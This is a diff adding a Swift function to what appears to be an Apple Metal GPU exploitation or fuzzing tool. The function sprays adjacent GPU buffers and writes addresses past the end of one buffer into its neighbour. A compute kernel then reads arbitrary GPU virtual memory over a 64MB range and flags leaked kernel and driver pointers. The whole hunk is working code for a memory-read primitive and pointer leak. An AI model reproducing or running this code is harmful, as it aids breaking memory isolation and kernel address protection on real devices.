@@ -3920,6 +3920,120 @@ func runDenseMapAndWrite(log: FuzzLog, completion: @escaping () -> Void) {
     }
 }
 
+// ── runWideVAScan ─────────────────────────────────────────────────────────────
+// Extended GPU VA sweep: 0x1500000000 – 0x1504000000 (64MB) at 4KB step.
+// 16,384 probes total, 256 dispatches × 64 threads.
+// Surfaces every stable Metal/AGX runtime allocation beyond the first 400KB.
+// Each hit is classified:
+//   ★★ KERNEL PTR  (0xfffffe…)  — direct kernel VA
+//   ★  GPU PTR     (0x14/15…)   — Metal driver pointer
+//      data                      — flags, counter, descriptor word
+// ─────────────────────────────────────────────────────────────────────────────
+func runWideVAScan(log: FuzzLog, completion: @escaping () -> Void) {
+    DispatchQueue.global(qos: .userInitiated).async {
+        func step(_ s: String) { log.append(s) }
+        step("── Wide VA Scan (64MB) ──")
+        guard let device = MTLCreateSystemDefaultDevice() else { step("✗ no device"); completion(); return }
+
+        let BUF_LEN  = 4096
+        let NTHREADS = 64
+
+        var sprayBufs: [MTLBuffer] = []
+        var lo: MTLBuffer!
+        var hi: MTLBuffer!
+        for _ in 0..<64 {
+            guard let b = device.makeBuffer(length: BUF_LEN, options: .storageModeShared) else { continue }
+            if let prev = sprayBufs.last, prev.gpuAddress + UInt64(BUF_LEN) == b.gpuAddress {
+                lo = prev; hi = b
+            }
+            sprayBufs.append(b)
+        }
+        guard lo != nil, hi != nil else { step("✗ spray failed"); completion(); return }
+        step("✓ lo=0x\(String(lo.gpuAddress,radix:16))")
+
+        let src = """
+        #include <metal_stdlib>
+        using namespace metal;
+        struct Probe { device ulong* buf; };
+        kernel void multiScan(device Probe* probes [[buffer(0)]],
+                              device ulong* out    [[buffer(1)]],
+                              uint tid [[thread_position_in_grid]]) {
+            out[tid] = probes[tid].buf[0];
+        }
+        """
+        guard let lib  = try? device.makeLibrary(source: src, options: nil),
+              let fn   = lib.makeFunction(name: "multiScan"),
+              let pso  = try? device.makeComputePipelineState(function: fn) else {
+            step("✗ PSO failed"); completion(); return
+        }
+        guard let outBuf = device.makeBuffer(length: NTHREADS * 8, options: .storageModeShared) else {
+            step("✗ outBuf failed"); completion(); return
+        }
+        step("✓ PSO ready — sweeping 0x1500000000..+64MB at 4KB step")
+
+        let loPtr  = lo.contents().assumingMemoryBound(to: UInt64.self)
+        let outPtr = outBuf.contents().assumingMemoryBound(to: UInt64.self)
+
+        func classify(_ val: UInt64) -> String {
+            let h = val >> 32
+            if h >= 0xFFFFFE00               { return "★★ KERNEL PTR" }
+            if h >= 0x14000000 && h <= 0x15FFFFFF { return "★  GPU PTR" }
+            return "   data"
+        }
+
+        let BASE: UInt64 = 0x1500000000
+        let SCAN_SIZE: UInt64 = 0x4000000  // 64MB
+        let STEP: UInt64 = 0x1000          // 4KB
+        let totalProbes = Int(SCAN_SIZE / STEP)  // 16384
+        let dispatches  = (totalProbes + NTHREADS - 1) / NTHREADS  // 256
+
+        var totalHits = 0
+        let tpg = MTLSize(width: min(NTHREADS, pso.maxTotalThreadsPerThreadgroup), height: 1, depth: 1)
+
+        for d in 0..<dispatches {
+            let batchStart = d * NTHREADS
+            let batchCount = min(NTHREADS, totalProbes - batchStart)
+            for t in 0..<batchCount {
+                let va = BASE + UInt64((batchStart + t)) * STEP
+                loPtr[BUF_LEN/8 + t * 2] = va
+                outPtr[t] = 0
+            }
+            guard let q   = device.makeCommandQueue(),
+                  let cb  = q.makeCommandBuffer(),
+                  let enc = cb.makeComputeCommandEncoder() else { continue }
+            enc.setComputePipelineState(pso)
+            enc.setBuffer(hi,    offset: 0, index: 0)
+            enc.setBuffer(outBuf,offset: 0, index: 1)
+            enc.dispatchThreads(MTLSize(width: batchCount, height: 1, depth: 1), threadsPerThreadgroup: tpg)
+            enc.endEncoding(); cb.commit(); cb.waitUntilCompleted()
+
+            for t in 0..<batchCount {
+                let val = outPtr[t]
+                if val != 0 {
+                    let va  = BASE + UInt64((batchStart + t)) * STEP
+                    // Skip our own spray buffers
+                    var ours = false
+                    for sb in sprayBufs { if sb.gpuAddress == va { ours = true; break } }
+                    if !ours {
+                        let tag = classify(val)
+                        step("  \(tag) VA=0x\(String(va,radix:16)) val=0x\(String(val,radix:16))")
+                        totalHits += 1
+                    }
+                }
+            }
+
+            if d % 32 == 31 {
+                let pct = (d + 1) * 100 / dispatches
+                step("  ... \(pct)% (\(d+1)/\(dispatches) dispatches, \(totalHits) hits so far)")
+            }
+        }
+
+        step("── Wide VA Scan complete: \(totalHits) total hits ──")
+        if totalHits == 0 { step("  no hits beyond spray range — all Metal allocations in first 400KB or above 64MB") }
+        completion()
+    }
+}
+
 // ── runNewHitDump ─────────────────────────────────────────────────────────────
 // Deep-dive into the two new GPU VA hits found in stage16:
 //   A: 0x1500029000 region (hits at +0x400 and +0x800)
